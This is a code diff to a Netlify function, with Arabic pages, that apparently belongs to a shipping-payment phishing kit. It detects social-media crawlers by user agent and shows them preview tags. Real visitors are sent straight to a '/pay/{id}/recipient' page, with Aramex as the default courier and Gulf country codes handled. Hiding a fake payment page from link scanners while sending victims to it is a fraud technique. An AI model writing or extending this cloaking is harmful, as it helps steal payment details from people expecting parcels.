@@ -193,7 +193,65 @@ exports.handler = async (event, context) => {
       }
     }
 
-    // Only continue processing if we have valid data
+    // Get site URL from headers
+    const host = event.headers?.host || event.headers?.['host'] || event.headers?.['Host'] || 'dynamic-sunflower-49efe2.netlify.app';
+    const protocol = event.headers?.['x-forwarded-proto'] || event.headers?.['X-Forwarded-Proto'] || 'https';
+    const siteUrl = `${protocol}://${host}`;
+
+    // Detect if this is a bot request (for social media sharing)
+    const ua = event.headers['user-agent'] || event.headers['User-Agent'] || '';
+    const isBot = /bot|facebookexternalhit|twitterbot|WhatsApp|Telegram|preview|crawler|spider|crawl/i.test(ua);
+
+    // If this is a real user (not a bot), redirect directly to the payment page
+    if (!isBot && id !== 'unknown') {
+      // Get service data for the redirect URL
+      const linkData = await getLinkData(id);
+
+      if (linkData?.type) {
+        type = linkData.type;
+      }
+
+      if (type === "shipping") {
+        // Determine service key
+        if (linkData?.payload?.service_key) {
+          serviceKey = linkData.payload.service_key;
+        } else if (linkData?.payload?.service) {
+          serviceKey = linkData.payload.service;
+        } else if (queryParams?.service) {
+          serviceKey = queryParams.service;
+        }
+
+        const normalizedKey = (serviceKey || '').toLowerCase().replace(/[^a-z0-9]/g, '');
+        const baseKey = normalizedKey.replace(/(kw|qa|om|bh|ae|sa)$/, '') || normalizedKey;
+        let serviceInfo = serviceData[normalizedKey] || serviceData[baseKey] || serviceData.aramex;
+        serviceName = linkData?.payload?.service_name || serviceInfo?.name || 'shipping';
+      }
+
+      // Redirect to receiver info page
+      const redirectUrl = `${siteUrl}/pay/${id}/recipient`;
+
+      return {
+        statusCode: 200,
+        headers: {
+          'Content-Type': 'text/html; charset=utf-8',
+          'Cache-Control': 'no-cache, no-store, must-revalidate'
+        },
+        body: `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="refresh" content="0; url=${redirectUrl}" />
+  <script>
+    window.location.href = '${redirectUrl}';
+  </script>
+</head>
+<body></body>
+</html>`
+      };
+    }
+
+    // Only continue processing for bot requests (social media crawlers)
     if (id !== 'unknown') {
       const country = countryData[countryCode];
 
@@ -302,11 +360,6 @@ exports.handler = async (event, context) => {
       }
     }
 
-    // Get site URL from headers or use default
-    const host = event.headers?.host || event.headers?.['host'] || event.headers?.['Host'] || 'dynamic-sunflower-49efe2.netlify.app';
-    const protocol = event.headers?.['x-forwarded-proto'] || event.headers?.['X-Forwarded-Proto'] || 'https';
-    const siteUrl = `${protocol}://${host}`;
-
     // Build full URL (exclude 'path' from query params as it's internal)
     const queryString = Object.entries(queryParams)
       .filter(([k]) => k !== 'path')
@@ -320,7 +373,7 @@ exports.handler = async (event, context) => {
       fullOgImage = `${siteUrl}${fullOgImage.startsWith('/') ? '' : '/'}${fullOgImage}`;
     }
 
-    // Generate HTML with proper meta tags
+    // Generate HTML with proper meta tags for bots
     const html = `<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
